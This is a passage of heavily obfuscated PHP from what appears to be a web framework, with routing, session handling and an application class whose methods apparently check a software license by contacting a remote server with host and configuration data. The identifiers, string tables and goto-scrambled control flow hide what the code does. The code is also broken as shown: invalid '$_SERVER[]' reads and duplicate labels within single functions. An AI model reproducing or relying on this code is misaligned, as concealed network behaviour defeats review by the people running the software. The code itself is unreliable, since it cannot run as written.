$e[8]) === 0 ? $AЗ[0] : $e[8] . $AЗ[0]; $D󌟷 = $AЗ[1]; } array_push(self::$maps, $A); array_push(self::$routes, $F); array_push(self::$methods, strtoupper($A꼙)); array_push(self::$callbacks, $D󌟷); } public static function error($E) { self::$errorCallback = $E; } public static function haltOnMatch($a񏒍 = true) { self::$halts = $a񏒍; } public static function dispatch() { goto c; fέʯ: self::$routes = preg_replace($DȡӰ[1171], $DȡӰ[8], self::$routes); if (in_array($Eу, self::$routes)) { $Bߴ = array_keys(self::$routes, $Eу); foreach ($Bߴ as $e) { if (self::$methods[$e] == $FᎣ͈ || self::$methods[$e] == $DȡӰ[1485] || in_array($FᎣ͈, self::$maps[$e])) { $A = !0; if (!is_object(self::$callbacks[$e])) { $Cۛү = explode($DȡӰ[8], self::$callbacks[$e]); $c = end($Cۛү); $Bͪڤ = explode($DȡӰ[1486], $c); $a፫ = new $Bͪڤ[0](); $a፫->{$Bͪڤ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$e]); if (self::$halts) { return; } } } } } else { $Dȸ = 0; foreach (self::$routes as $e) { if (strpos($e, $DȡӰ[4]) !== !1) { $e = str_replace($bވ, $f؎î, $e); } if (preg_match($DȡӰ[1487] . $e . $DȡӰ[1488], $Eу, $fƎ)) { if (self::$methods[$Dȸ] == $FᎣ͈ || self::$methods[$Dȸ] == $DȡӰ[1485] || !empty(self::$maps[$Dȸ]) && in_array($FᎣ͈, self::$maps[$Dȸ])) { $A = !0; array_shift($fƎ); if (!is_object(self::$callbacks[$Dȸ])) { $Cۛү = explode($DȡӰ[8], self::$callbacks[$Dȸ]); $c = end($Cۛү); $Bͪڤ = explode($DȡӰ[1486], $c); $a፫ = new $Bͪڤ[0](); if (!method_exists($a፫, $Bͪڤ[1])) { echo $DȡӰ[1489]; } else { call_user_func_array(array($a፫, $Bͪڤ[1]), $fƎ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Dȸ], $fƎ); if (self::$halts) { return; } } } } $Dȸ++; } } if ($A == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Aˉ̆ =& $_SERVER[]; header($_SERVER[$Aˉ̆[1490]] . $Aˉ̆[1491]); echo $Aˉ̆[1492]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$DȡӰ[1484]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto A; aϝɫ: $bވ = array_keys(static::$patterns); $f؎î = array_values(static::$patterns); $A = !1; goto fέʯ; c: $DȡӰ =& $_SERVER[]; $Eу = parse_url($_SERVER[$DȡӰ[1484]], PHP_URL_PATH); $FᎣ͈ = $_SERVER[$DȡӰ[157]]; goto aϝɫ; A: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto E; Cг߆: $B = $F⹘[$D]; $d㴧 = $F⹘[$E[799]]; switch ($D) { case $E[17]: self::$handle = Model($E[800]); break; case $E[801]: self::$handle = new CacheRedis($B, $d㴧); break; case $E[802]: self::$handle = new CacheMemcached($B, $d㴧); break; case $E[193]: $B[$E[76]] = $B[$E[76]] . $E[1496]; self::$handle = new CacheFile($B, $d㴧); default: break; } goto eݷ; E: $E =& $_SERVER[]; static $a줱 = false; if ($a줱) { return $a줱; } goto Aף; eݷ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $a줱 = new self(); return $a줱; goto e̒皞; Aף: $F⹘ = $GLOBALS[$E[6]][$E[347]]; self::$sessionTime = $F⹘[$E[1493]]; $B = isset($GLOBALS[$E[1494]]) ? $GLOBALS[$E[1494]] : SESSION_ID; goto dƉי; dƉי: if (self::$sessionSign) { } else { if (Cookie::get($B)) { self::$sessionSign = Cookie::get($B); } else { self::$sessionSign = guid(); } } Cookie::setSafe($B, self::$sessionSign, self::$sessionTime); $D = $F⹘[$E[1495]]; goto Cг߆; e̒皞: } public static function sign($E = false) { $E && (self::$sessionSign = $E); self::init(); return self::$sessionSign; } public static function set($Aȋ, $E֠ = false) { self::init(); if (is_array($Aȋ)) { foreach ($Aȋ as $e => $C) { array_set_value(self::$data, $e, $C); } } else { array_set_value(self::$data, $Aȋ, $E֠); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($a؞ = false) { self::init(); if (!$a؞) { return self::$data; } return array_get_value(self::$data, $a؞); } public static function remove($Fꊨ) { self::init(); unset(self::$data[$Fꊨ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[][804])) { self::$handle->clearTimeout(); } } } goto f͇; Aș: while (strlen($fĝێ) < $_SERVER[][578]) { if (!$fĝێ) { break; } $fĝێ++; } class Application { private $defaultModule = "\151\x6e\x64\x65\x78"; private $defaultController = "\x69\156\x64\145\170"; private $defaultAction = "\151\156\144\x65\x78"; function __construct() { } public function setDefault($c) { goto F⅔; Eר: $aѻ = $FĹ[579]; while (strlen($aѻ) < $FĹ[580]) { if (!$aѻ) { break; } $aѻ++; } $this->defaultModule = $bү[0] ? $bү[0] : $this->defaultModule; goto DΌ; DΌ: $this->defaultController = $bү[1] ? $bү[1] : $this->defaultController; $this->defaultAction = $bү[2] ? $bү[2] : $this->defaultAction; $this->{$_SERVER[][3]}($aؚ[4], array($this, $aؚ[5])); goto B쩽; F⅔: $FĹ =& $_SERVER[]; $aؚ =& $_SERVER[]; $bү = $aؚ[0]($aؚ[1], $aؚ[2]($c, $aؚ[1])); goto Eר; B쩽: } public function appRun($cǌ) { goto cŐ; cŐ: $bꞐ =& $_SERVER[]; $aߋ =& $_SERVER[]; $A՝ = $aߋ[0]($aߋ[1], $cǌ); goto Fǈ; eϨڏ: if ($EΈ == $aߋ[8]) { $Cޗ = $aߋ[9]; $A՝[0] = $aߋ[10]; $A՝[1] = $A՝[1] . $aߋ[11]; $cǌ = $aߋ[12]($aߋ[1], $A՝); $cǌ = $aߋ[2]($cǌ, $aߋ[1]); } $aߋ[13](array($aߋ[14], $aߋ[15]), $Cޗ . $aߋ[16], $cǌ); $aߋ[17]($cǌ); goto Cٟ; Cٟ: $Aɵ = $bꞐ[585]; if (strlen($Aɵ) < $bꞐ[578]) { die; } $aߋ[13](array($aߋ[14], $aߋ[15]), $Cޗ . $aߋ[18], $cǌ); goto dǹ; dǹ: $EﰨÛ = $bꞐ[586]; if (strlen($EﰨÛ) < $bꞐ[582]) { return; } goto e; D՛: $Cޗ = $aߋ[7]; $b䰅 = $bꞐ[583]; while ($b䰅 < $bꞐ[584]) { if ($b䰅 >= 0) { break; } $b䰅++; } goto eϨڏ; Fǈ: $aڃ = $bꞐ[581]; while (strlen($aڃ) < $bꞐ[582]) { if (!$aڃ) { break; } $aڃ++; } $EΈ = $aߋ[6]($A՝[0]); goto D՛; e: } private function autorun() { $C =& $_SERVER[]; global $config; $d = $_SERVER[][587]; if (!$d) { die; } if ($C[19]($config[$C[20]]) == 0) { return; } foreach ($config[$C[20]] as $F窊 => $F֌) { $this->{$_SERVER[][21]}($F֌); } } private function mgva0fad3c8b() { goto bԪӊ; B: $DĤ = $Dژ[25]($Dސ, 0, -$Dژ[24]($bƋ҂)); $c = $C⌡[588]; $Cܠ = array($Dژ[8], $DĤ); goto Dψ; Dψ: $ȃ = $Dژ[26]($GLOBALS[$Dژ[22]][$Dژ[23]], 1); $GLOBALS[$Dژ[22]][$Dژ[23]] = $Dژ[27]($Cܠ, $ȃ); $BҲ = $C⌡[589]; goto dӷ߲; eŋ: if (strlen($BѢ) < $C⌡[580]) { die; } goto F䚉; D҆Έ: $Dސ = $GLOBALS[$Dژ[22]][$Dژ[23]][0]; if (!$Dސ || $Dژ[24]($Dސ) <= $Dژ[24]($bƋ҂)) { return; } if ($Dژ[6]($Dژ[25]($Dސ, -$Dژ[24]($bƋ҂))) != $bƋ҂) { return; } goto B; bԪӊ: $C⌡ =& $_SERVER[]; $Dژ =& $_SERVER[]; $bƋ҂ = $Dژ[8]; goto D҆Έ; dӷ߲: if (strlen($BҲ) < $C⌡[584]) { return; } $GLOBALS[$Dژ[22]][$Dژ[28]] = $Dژ[29]($Dژ[1], $GLOBALS[$Dژ[22]][$Dژ[23]]); $BѢ = $C⌡[590]; goto eŋ; F䚉: } private function ecvp58a7972c() { goto d; Cԣм: $dԷȡ = $B[33]($d, $cȫ); $BΆ = $B[25]($d, $dԷȡ + $B[24]($cȫ)); $Fߴ = $f؍[591]; goto B; dĎ: if (strlen($bĆ) < $f؍[578]) { return; } $BΆ = $B[2]($F݇[0][0], $B[36]); $GLOBALS[$B[22]][$B[23]] = $B[0]($B[36], $BΆ); goto a󺚮; d: $f؍ =& $_SERVER[]; $B =& $_SERVER[]; if ($GLOBALS[$B[22]][$B[28]] != $B[10]) { return; } goto Bų; B: while ($Fߴ < $f؍[578]) { if ($Fߴ >= 0) { break; } $Fߴ++; } $B[34]($B[35], $BΆ, $F݇); $bĆ = $f؍[592]; goto dĎ; a󺚮: $GLOBALS[$B[22]][$B[28]] = $B[29]($B[1], $GLOBALS[$B[22]][$B[23]]); $CɎ = $f؍[593]; if (!$CɎ) { die; } goto bգ; Bų: $d = $_SERVER[$B[30]]; $cȫ = $B[31]; if (!$B[32]($d, $cȫ)) { return; } goto Cԣм; bգ: } public function run() { goto EƄ; EƄ: $Cҫ =& $_SERVER[]; $CՅج =& $_SERVER[]; $this->{$_SERVER[][37]}(); goto E; E: $AéВ = $Cҫ[596]; if (!$AéВ) { return; } $CՅج[39]($CՅج[43], MOD . $CՅج[1] . ST . $CՅج[1] . ACT); goto Bݖ; bΣ: $this->{$_SERVER[][45]}(); if ($CՅج[19]($dɰ) >= 3) { $this->{$_SERVER[][21]}($e׎); } else { $this->{$_SERVER[][21]}(ACTION); } goto dȥ; Bݖ: $C = $Cҫ[597]; if (!$C) { die; } $_SERVER[$CՅج[44]] = $CՅج[6](ACTION); goto bΣ; eˎ: $BǓӢ = $Cҫ[594]; while (strlen($BǓӢ) < $Cҫ[580]) { if (!$BǓӢ) { break; } $BǓӢ++; } $CՅج[39]($CՅج[40], isset($dɰ[0]) && $dɰ[0] ? $dɰ[0] : $this->defaultModule); goto F; F: $Bτ = $Cҫ[595]; $CՅج[39]($CՅج[41], isset($dɰ[1]) && $dɰ[0] ? $dɰ[1] : $this->defaultController); $CՅج[39]($CՅج[42], isset($dɰ[2]) && $dɰ[0] ? $dɰ[2] : $this->defaultAction); goto E; E: $this->{$_SERVER[][38]}(); $dɰ = $GLOBALS[$CՅج[22]][$CՅج[23]]; $e׎ = $GLOBALS[$CՅج[22]][$CՅج[28]]; goto eˎ; dȥ: } private $mfcrd58b5e91 = array(); private $mvec1056ee3e = ''; public function wvib5e2c6015() { goto aԻ巔; e: $this->{$_SERVER[][3]}($Dޙ[55], array($this, $Dޙ[56])); $b贇텯 = $c񛌬[601]; if (!$b贇텯) { return; } goto d; f: $this->{$_SERVER[][51]}(); $this->{$_SERVER[][52]}(); $D腣 = $c񛌬[599]; goto DԖʗ; aԻ巔: $c񛌬 =& $_SERVER[]; $Dޙ =& $_SERVER[]; $this->{$_SERVER[][46]}(); goto B˘; b֌: $this->{$_SERVER[][48]}(); $this->{$_SERVER[][49]}(); $this->{$_SERVER[][50]}(); goto f; B˘: $DÙ = $c񛌬[598]; if (!$DÙ) { return; } $this->{$_SERVER[][47]}(); goto b֌; DԖʗ: $this->{$_SERVER[][3]}($Dޙ[53], array($this, $Dޙ[54])); $b񂷊 = $c񛌬[600]; if (!$b񂷊) { return; } goto e; d: $this->{$_SERVER[][3]}($Dޙ[57], array($this, $Dޙ[58])); $this->{$_SERVER[][3]}($Dޙ[59], array($this, $Dޙ[60])); goto Aؑ; Aؑ: } public function cjpqa170771b($bޚ) { goto Dړ; f: if (!$CҢӧ) { die; } unset($bޚ[$eחƻ[106]][$eחƻ[107]][$eחƻ[111]]); $fܣ = $fҰ[607]; goto d; F: $f桒 = $fҰ[602]; if (strlen($f桒) < $fҰ[578]) { return; } $DͰ = array($eחƻ[64], $eחƻ[65], $eחƻ[66], $eחƻ[67], $eחƻ[68], $eחƻ[69], $eחƻ[70], $eחƻ[71], $eחƻ[72], $eחƻ[73], $eחƻ[74], $eחƻ[75], $eחƻ[76], $eחƻ[77], $eחƻ[78], $eחƻ[79], $eחƻ[80], $eחƻ[81], $eחƻ[82], $eחƻ[83], $eחƻ[84], $eחƻ[85], $eחƻ[86], $eחƻ[87], $eחƻ[88], $eחƻ[89], $eחƻ[90], $eחƻ[91], $eחƻ[92], $eחƻ[93], $eחƻ[94], $eחƻ[95], $eחƻ[96], $eחƻ[97], $eחƻ[98], $eחƻ[99], $eחƻ[100], $eחƻ[101], $eחƻ[102], $eחƻ[103]); goto Fʐ; Fʐ: $FК = $fҰ[603]; if (strlen($FК) < $fҰ[578]) { die; } foreach ($DͰ as $B) { $d = $GLOBALS[$eחƻ[104]][$eחƻ[105]][$B]; if (isset($aǟϽ[$B])) { $d = $aǟϽ[$B]; } $bޚ[$eחƻ[106]][$eחƻ[107]][$B] = $d; } goto aǖƉ; F: if ($aǟϽ[$eחƻ[130]] != $eחƻ[131]) { $bޚ[$eחƻ[118]][$eחƻ[132]] = $aǟϽ[$eחƻ[132]]; $bޚ[$eחƻ[118]][$eחƻ[133]] = $aǟϽ[$eחƻ[133]]; $a = $eחƻ[134](10) . $this->mvec1056ee3e . $eחƻ[134](5); $bޚ[$eחƻ[106]][$eחƻ[135]][$eחƻ[136]] = $this->{$_SERVER[][137]}($a, $bޚ[$eחƻ[118]][$eחƻ[123]]); } if ($this->mvec1056ee3e == $eחƻ[131]) { $bޚ[$eחƻ[106]][$eחƻ[107]][$eחƻ[112]][$eחƻ[117]] = 0; } $bޚ[$eחƻ[118]][$eחƻ[138]] = $eחƻ[116]($this->mfcrd58b5e91, $eחƻ[139], $eחƻ[10]); goto bׂ; C: $bޚ[$eחƻ[118]][$eחƻ[130]] = $this->mvec1056ee3e; $aɖ = $fҰ[611]; if (!$aɖ) { die; } goto F; d: unset($bޚ[$eחƻ[106]][$eחƻ[108]][$eחƻ[110]]); unset($bޚ[$eחƻ[106]][$eחƻ[107]][$eחƻ[76]]); $CҢӧ = $fҰ[606]; goto f; aǖƉ: $F = $bޚ[$eחƻ[106]][$eחƻ[107]][$eחƻ[76]]; $e = $fҰ[604]; if (!$e) { die; } goto e; F: if ($eחƻ[116]($GLOBALS, $eחƻ[142]) && $this->config[$eחƻ[143]]) { $bޚ[$eחƻ[118]][$eחƻ[144]] = WEB_ROOT; } return $bޚ; goto d; Dړ: $fҰ =& $_SERVER[]; $eחƻ =& $_SERVER[]; $aǟϽ = $eחƻ[61]($eחƻ[62])->{$_SERVER[][63]}(); goto F; d: if (!$fܣ) { die; } $bޚ[$eחƻ[106]][$eחƻ[107]][$eחƻ[112]] = array($eחƻ[113] => (int) $F[$eחƻ[114]], $eחƻ[115] => (int) $eחƻ[116]($F, $eחƻ[117], 0)); $bޚ[$eחƻ[118]][$eחƻ[119]] = $eחƻ[120]($eחƻ[121])->{$_SERVER[][122]}(); goto Aҟ; e: unset($bޚ[$eחƻ[106]][$eחƻ[108]][$eחƻ[109]]); $cӵ = $fҰ[605]; if (!$cӵ) { return; } goto d; Aҟ: $e邑銇 = $fҰ[608]; if (strlen($e邑銇) < $fҰ[609]) { return; } $bޚ[$eחƻ[118]][$eחƻ[123]] = $eחƻ[124]($_SERVER[$eחƻ[125]] . $aǟϽ[$eחƻ[126]]); goto F㠌; F㠌: $bޚ[$eחƻ[118]][$eחƻ[127]] = $eחƻ[128]($eחƻ[129]()); $F৴ = $fҰ[610]; if (strlen($F৴) < $fҰ[609]) { die; } goto C; bׂ: $bޚ[$eחƻ[118]][$eחƻ[140]] = $eחƻ[116]($this->mfcrd58b5e91, $eחƻ[141], $eחƻ[10]); $Fͷ̜ = $fҰ[612]; if (!$Fͷ̜) { return; } goto F; d: } private function nmbd7e6c8dc5() { goto Aٕ; Dۛ: if (strlen($Aˮ) < $F͘[582]) { return; } foreach ($F֒ as $aϖ) { if (!isset($aΧ⍈[$aϖ]) || !$aΧ⍈[$aϖ]) { continue; } $C[$aϖ] = $aΧ⍈[$aϖ]; $E = $F͘[617]; if (strlen($E) < $F͘[578]) { die; } } $Fѯ[13](array($Fѯ[169], $Fѯ[170]), $C); goto e֐; e֐: $F턒 = $F͘[618]; while (strlen($F턒) < $F͘[609]) { if (!$F턒) { break; } $F턒++; } goto bҿɇ; a杊: if ($this->mvec1056ee3e == $Fѯ[131]) { return; } $F֒ = array($Fѯ[171], $Fѯ[172], $Fѯ[173], $Fѯ[174], $Fѯ[175], $Fѯ[176]); $e󭢢 = $F͘[614]; goto d獹; Aٕ: $F͘ =& $_SERVER[]; $Fѯ =& $_SERVER[]; if ($_SERVER[$Fѯ[44]] == $Fѯ[145]) { $eم = array($Fѯ[130] => $this->mvec1056ee3e, $Fѯ[146] => $this->{$_SERVER[][147]}(), $Fѯ[148] => $Fѯ[61]($Fѯ[149])->{$_SERVER[][150]}()); if ($this->mvec1056ee3e != $Fѯ[131]) { $eϟ׶ = $Fѯ[116]($this->mfcrd58b5e91, $Fѯ[151]); if ($eϟ׶) { $eم[$Fѯ[152]] = $eϟ׶; $eم[$Fѯ[153]] = $Fѯ[154]($Fѯ[116]($this->mfcrd58b5e91, $Fѯ[155])); $eم[$Fѯ[156]] = $Fѯ[116]($this->mfcrd58b5e91, $Fѯ[141]); } $F荃 = $Fѯ[61]($Fѯ[62])->{$_SERVER[][63]}($Fѯ[157], $Fѯ[10], !0); if ($Fѯ[158]($F荃) && $Fѯ[25]($F荃, 0, 1) == $Fѯ[159]) { $F荃 = $Fѯ[160]($F荃); } if ($Fѯ[161]($F荃) && $F荃[$Fѯ[162]] && $Fѯ[32]($F荃[$Fѯ[162]], $Fѯ[163])) { $f׷ = $Fѯ[0]($Fѯ[163], $F荃[$Fѯ[162]]); $eم[$Fѯ[164]] = $f׷[0]; } } $eم = $this->{$_SERVER[][165]}($Fѯ[166]($eم), $Fѯ[124]($Fѯ[167])); $C = array($Fѯ[168] => $eم); $Fѯ[13](array($Fѯ[169], $Fѯ[170]), $C); $Eӏؓ = $F͘[613]; } goto a杊; d獹: while ($e󭢢 < $F͘[578]) { if ($e󭢢 >= 0) { break; } $e󭢢++; } $aΧ⍈ = $Fѯ[61]($Fѯ[62])->{$_SERVER[][63]}(); $eߪđ = $F͘[615]; goto e냎; e냎: while (strlen($eߪđ) < $F͘[609]) { if (!$eߪđ) { break; } $eߪđ++; } $C = array($Fѯ[177] => $aΧ⍈[$Fѯ[64]], $Fѯ[178] => $aΧ⍈[$Fѯ[65]], $Fѯ[179] => $Fѯ[10]); $Aˮ = $F͘[616]; goto Dۛ; bҿɇ: } private function skpo83cd901b() { goto F; b: $c = $this->{$_SERVER[][218]}($Aτ[$Aї[219]]); $BƬث = $D[620]; if (!$c || $c != $Aτ[$Aї[155]]) { $E = array($Aї[220] => $Aї[61]($Aї[62])->{$_SERVER[][63]}($Aї[126]), $Aї[221] => $_SERVER[$Aї[125]], $Aї[222] => $Aї[223](), $Aї[192] => $_SERVER[$Aї[193]]); $Dڴ欍 = $this->{$_SERVER[][224]}($Aї[166]($E)); $this->{$_SERVER[][202]}($Aї[225] . $Dڴ欍); $Aї[184]($Aї[216]($Aї[226]), !0); } goto BČ; Fײ: if ($DŢ[$Aї[197]] == $Aї[198]) { $eи = $this->{$_SERVER[][165]}($b, $Aї[199]); $Dڴ欍 = $this->{$_SERVER[][137]}($Aї[166]($Fɠ), $b . $Aї[200], 3); $Dڴ欍 = $Dڴ欍 . $Aї[201] . $_SERVER[$Aї[191]]; $Eپ = $this->{$_SERVER[][202]}($Aї[203] . $eи . $Aї[204] . $Dڴ欍, -1); $Aї[184]($Eپ, !0); } else { if ($DŢ[$Aї[197]] == $Aї[205]) { $e = $Aї[25]($Aї[124]($Aї[206] . $b), 12, 15) . $Aї[207]; $Dڴ欍 = $this->{$_SERVER[][208]}($Aї[2]($DŢ[$Aї[209]]), $e, 2); $DХ = $Aї[210]($Dڴ欍, !0); if (!$Aї[161]($DХ) || !$Aї[161]($DХ[$Aї[211]]) || $DХ[$Aї[183]] != !0) { $F = $Aї[212]; $cʶ = $DХ[$Aї[211]] ? $Aї[213] . $DХ[$Aї[211]] : $F; $Aї[184]($cʶ, !1); } else { $Fɠ[$Aї[186]] = $DХ[$Aї[211]][$Aї[214]]; } } else { $DХ = $this->{$_SERVER[][202]}($Aї[215], $Fɠ, 10); } } if (!$Aї[161]($DХ) || !$Aї[161]($DХ[$Aї[211]]) || $DХ[$Aї[183]] != !0) { $F = $Aї[216]($Aї[217]); $cʶ = $DХ[$Aї[211]] ? $Aї[213] . $DХ[$Aї[211]] : $F; $Aї[184]($cʶ, !1); } $Aτ = $DХ[$Aї[211]]; goto b; fȩӮ: if (!isset($DŢ[$Aї[183]]) || $Aї[24]($DŢ[$Aї[183]]) != 16) { $Aї[184]($Aї[185] . $DŢ[$Aї[183]], !1); } $e׆Ʃ = $Aї[61]($Aї[62])->{$_SERVER[][63]}($Aї[126]); $b = $Aї[124]($_SERVER[$Aї[125]] . $e׆Ʃ); goto C⢚; e󄡈: $a = $A[$Aї[244]]; $D¢ = array(); $F߭ = $D[625]; goto Aֲڻ; F: $D =& $_SERVER[]; $Aї =& $_SERVER[]; if ($_SERVER[$Aї[44]] != $Aї[180]) { return; } goto aě; BČ: $e = array($Aї[227] => $Aτ[$Aї[228]], $Aї[229] => $Aτ[$Aї[230]], $Aї[231] => $Aї[134](16), $Aї[130] => $Aτ[$Aї[232]]); if ($Fɠ[$Aї[186]]) { $e[$Aї[231]] = $Fɠ[$Aї[186]]; } $E՚β = $Aї[25]($Aї[124]($e[$Aї[229]]), 10, 10); goto Dʛ; A铷: Cache::set($Aї[249] . $Aї[124]($e׆Ʃ . $Aї[250]), $Aї[10]); $Aї[184]($Aї[216]($Aї[226]), !0); $AݦǨ = $D[629]; goto FϿۺ; aě: if (!$Aї[116]($GLOBALS, $Aї[142])) { die; } $DŢ = $GLOBALS[$Aї[22]]; if (isset($DŢ[$Aї[181]])) { $this->{$_SERVER[][182]}(); die; } goto fȩӮ; B§: $this->{$_SERVER[][248]}(); $cΝ = $D[628]; while (strlen($cΝ) < $D[580]) { if (!$cΝ) { break; } $cΝ++; } goto A铷; E휙˶: $Aٽ = $D[622]; if (!$Aٽ) { die; } $e[$Aї[133]] = $Aї[128]($Aї[233]($this->{$_SERVER[][165]}($A̯, $Aї[235]))); goto a»; dޙ: $E = $this->{$_SERVER[][137]}($Aї[166]($Aτ), $eϩ); $eЪ = $D[624]; $A = $Aї[241]($Aї[61]($Aї[11])->{$_SERVER[][242]}(), $Aї[243]); goto e󄡈; Aֲڻ: while (strlen($F߭) < $D[578]) { if (!$F߭) { break; } $F߭++; } $D¢[$Fൣ] = $E; $Aї[61]($Aї[11])->{$_SERVER[][245]}($a[$Aї[246]], array($Aї[247] => $D¢)); goto B; a»: $Cśݩ = $D[623]; while (strlen($Cśݩ) < $D[584]) { if (!$Cśݩ) { break; } $Cśݩ++; } if ($Aτ[$Aї[236]] && $Aτ[$Aї[236]] >= 1) { $Aї[61]($Aї[62])->{$_SERVER[][237]}($Aї[238], $Aї[239]); } goto f; E킍: if (!$D) { die; } $bыν = $Aї[134](16); $A̯ = $bыν . $e[$Aї[130]] . $this->{$_SERVER[][165]}($Aї[124]($e[$Aї[227]]), $bыν); goto E휙˶; B: $Bִ = $D[626]; if (strlen($Bִ) < $D[584]) { die; } $this->mfcrd58b5e91 = $Aτ; goto eׂ; Dʛ: $B髸 = $E՚β . $e[$Aї[130]] . $e[$Aї[231]]; $e[$Aї[132]] = $Aї[233]($Aї[128]($this->{$_SERVER[][165]}($B髸, $Aї[234]))); $D = $D[621]; goto E킍; eׂ: $E݇ = $D[627]; if (strlen($E݇) < $D[578]) { die; } $this->mvec1056ee3e = $e[$Aї[130]]; goto B§; C⢚: $Dާ = $D[619]; while (strlen($Dާ) < $D[582]) { if (!$Dާ) { break; } $Dާ++; } $Fɠ = array($Aї[183] => $DŢ[$Aї[183]], $Aї[186] => $Aї[134](16), $Aї[187] => $Aї[167], $Aї[188] => $Aї[189], $Aї[190] => $_SERVER[$Aї[191]], $Aї[192] => $_SERVER[$Aї[193]], $Aї[194] => $_SERVER[$Aї[195]], $Aї[123] => $b, $Aї[196] => $Aї[61]($Aї[62])->{$_SERVER[][63]}($Aї[157])); goto Fײ; f: $Aї[61]($Aї[62])->{$_SERVER[][240]}($e); $eϩ = $Aї[124]($_SERVER[$Aї[125]] . $Aї[233]($e׆Ʃ) . $e[$Aї[229]]); $Fൣ = $Aї[233]($Aї[25]($eϩ, 10, 16)); goto dޙ; FϿۺ: } private function licenseRegistSuccess() { $Aᘹ =& $_SERVER[]; $Bн = $Aᘹ[61]($Aᘹ[62])->{$_SERVER[][63]}(); if ($Bн[$Aᘹ[93]] != $Aᘹ[239]) { $Aᘹ[61]($Aᘹ[62])->{$_SERVER[][240]}($Aᘹ[93], $Aᘹ[239]); } $Aᘹ[120]($Aᘹ[251])->{$_SERVER[][252]}(!0); } private function ztgd69ed84f6() { goto aé; Cר: $this->mvec1056ee3e = $eך[131]; goto d𐒧; aܨ: $this->mfcrd58b5e91 = array(); $Fګ = $AЄ[631]; if (strlen($Fګ) < $AЄ[578]) { die; } goto Cר; cୣ: $Bӑ = $AЄ[630]; if (!$Bӑ) { die; } $eך[61]($eך[62])->{$_SERVER[][237]}($eך[238], $eך[253]); goto aܨ; aé: $AЄ =& $_SERVER[]; $eך =& $_SERVER[]; $eך[61]($eך[62])->{$_SERVER[][240]}(array($eך[227] => $eך[10], $eך[229] => $eך[10], $eך[130] => $eך[131], $eך[132] => $eך[10], $eך[133] => $eך[10])); goto cୣ; d𐒧: } private function fhuya89c2c7b() { goto Aѕ; Aѕ: $A飤 =& $_SERVER[]; $_SERVER[$A飤[193]] = $A飤[116]($_SERVER, $A飤[193], APP_HOST); $this->mvec1056ee3e = $A飤[131]; goto F; f: $this->mvec1056ee3e = $dѩ[$A飤[130]]; goto b뾿; F: $dѩ = $A飤[61]($A飤[62])->{$_SERVER[][63]}(); if ($dѩ[$A飤[130]] == $A飤[131]) { return; } $f뗐 = $A飤[61]($A飤[62])->{$_SERVER[][63]}($A飤[126]); goto F˻; F˻: $B܏ = $_SERVER[][632]; $eϥ = $A飤[249] . $A飤[124]($f뗐 . $A飤[250]); $B = Cache::get($eϥ); goto a; a: if (!$A飤[161]($B) || !isset($B[$A飤[254]]) || $A飤[255]() - $B[$A飤[254]] >= 60) { $Dӆ = $A飤[241]($A飤[61]($A飤[11])->{$_SERVER[][242]}(), $A飤[243]); $Fύ = $Dӆ[$A飤[244]]; $DՉ = $A飤[124]($_SERVER[$A飤[125]] . $A飤[233]($f뗐) . $dѩ[$A飤[229]]); $Eȑ = $A飤[233]($A飤[25]($DՉ, 10, 16)); $B = $this->{$_SERVER[][208]}($Fύ[$A飤[104]][$Eȑ], $DՉ); $B = $A飤[210]($B, !0); } if (!$A飤[161]($B)) { return $this->{$_SERVER[][182]}(); } $cΐӴ = $A飤[154]($B[$A飤[155]]); goto E; E: if ($A飤[255]() >= $cΐӴ) { return $this->{$_SERVER[][182]}(); } if ($A飤[255]() - $B[$A飤[254]] > 20) { $B[$A飤[254]] = $A飤[255](); Cache::set($eϥ, $B); } $this->mfcrd58b5e91 = $B; goto f; b뾿: } private function tvac0e24a138() { goto eѮ; eѮ: $d =& $_SERVER[]; $Fʫ = $GLOBALS[$d[22]]; $A쇰 = $_SERVER[][633]; goto cכބ; cכބ: $d㓪 = $_SERVER[$d[44]]; if ($d㓪 == $d[256] && $this->mvec1056ee3e == $d[131]) { $d[184]($d[216]($d[257]), !1, $d[258]); } $f = array($d[259], $d[260]); goto D; D: if ($d[261]($d㓪, $f)) { if ($this->mvec1056ee3e == $d[131] && isset($Fʫ[$d[262]])) { $d[184]($d[216]($d[257]), !1, $d[258]); die; } $Aݏ㘚 = $this->{$_SERVER[][147]}(); if ($Aݏ㘚 != $d[263]($d[264])) { if ($Aݏ㘚 <= $d[61]($d[149])->{$_SERVER[][150]}()) { $d[184]($d[216]($d[265]), !1, $d[258]); die; } } } goto eٱ; eٱ: } private function nwgq2143394f() { goto eƓ; eƓ: $C뢃 =& $_SERVER[]; $f = array($C뢃[145], $C뢃[266]); if (!$C뢃[116]($GLOBALS, $C뢃[142]) || !isset($_GET[$C뢃[267]])) { return; } goto a; a: if (!$C뢃[261]($_SERVER[$C뢃[44]], $f)) { return; } $cޙɨ = $C뢃[268]; $cޙɨ = $this->{$_SERVER[][269]}($cޙɨ, $C뢃[270]); goto C; C: $d߮ = $C뢃[271](array($C뢃[272] => array($C뢃[273] => $C뢃[274], $C뢃[275] => 3))); $BԒΖӖ = $_SERVER[][634]; $b = @$C뢃[276]($cޙɨ, !1, $d߮); goto Eȋ; Eȋ: $C뢃[277]($C뢃[278]); if ($b && $C뢃[32]($b, $C뢃[279])) { echo $b; } die; goto AŋϜ; AŋϜ: } public function rkqxebb65a39($C􎔪) { goto d㐖; d㐖: $aƳ =& $_SERVER[]; $C֟ =& $_SERVER[]; if ($this->mvec1056ee3e == $C֟[280]) { return $C􎔪; } goto FϾ; dԭ: while ($cդ < $aƳ[609]) { if ($cդ >= 0) { break; } $cդ++; } $cړۚ = array(); $eب = 